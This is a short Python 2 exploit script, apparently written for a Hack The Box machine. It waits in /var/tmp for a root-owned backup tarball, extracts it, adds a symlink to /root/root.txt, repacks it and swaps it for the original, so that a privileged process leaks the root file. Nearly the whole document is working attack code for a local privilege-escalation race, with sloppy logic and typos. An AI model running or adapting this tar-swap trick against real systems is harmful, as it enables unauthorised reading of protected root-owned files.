#The script runs in loop searching for file creatin with a specific patterm
#when file is found, the file copied to another directory, tar extact the file, add a new root file
#a new tar created with the same name and replaced with the old file
#when root executes it, the root is printed in log file on HTB

#!/usr/bin/env python

import os
import subprocess
import tarfile
import shutil
import re
import time

#making temp dir
tempdir='/var/tmp/tempy'
flag=1;
while flag:
    time.sleep(1)
    print "."
    for file in os.listdir("/var/tmp"):
	    x = re.search("^\.[0-9a-f]{40}",file)
	    
	    
	    if x:
	        flag=0  


for file in os.listdir("."):
	x = re.search("^\.[0-9a-f]{40}",file)
	
	if x:
	    found=file;
	    os.mkdir('/var/tmp/tempy')
	    print "found one ==============================================================================================="
	    break
	else:
	    print file
	    print "file not found : exiting"
	    continue
if not x:
    exit();	       
src_dir=found;
	    
dst_dir="/var/tmp/tempy"
	    
shutil.copy('/var/tmp/'+src_dir,dst_dir)
	    
os.chdir("/var/tmp/tempy")
for name in os.listdir("."):
    
    os.chmod(name,0777)
    pf = tarfile.open(name,'r:gz');
    for searching in pf.getnames():
        if '.empty' in searching:
            continue
        pf.extract(searching)
        print searching
    #pf.extractall();
    pf.close();
    subprocess.Popen("ln -s /root/root.txt /var/tmp/tempy/root.txt", shell=True, stdout=subprocess.PIPE).stdout.read()
    os.remove(found);
    
#subprocess.Popen("/bin/tar -zxvf", shell=True, stdout=subprocess.PIPE).stdout.read()

pf = tarfile.open(found, "w:gz");
for name in os.listdir("."):
    pf.add(name);
pf.close();
os.remove('../'+found);
shutil.copy(found,'../')
shutil.rmtree(tempdir);
print "done"
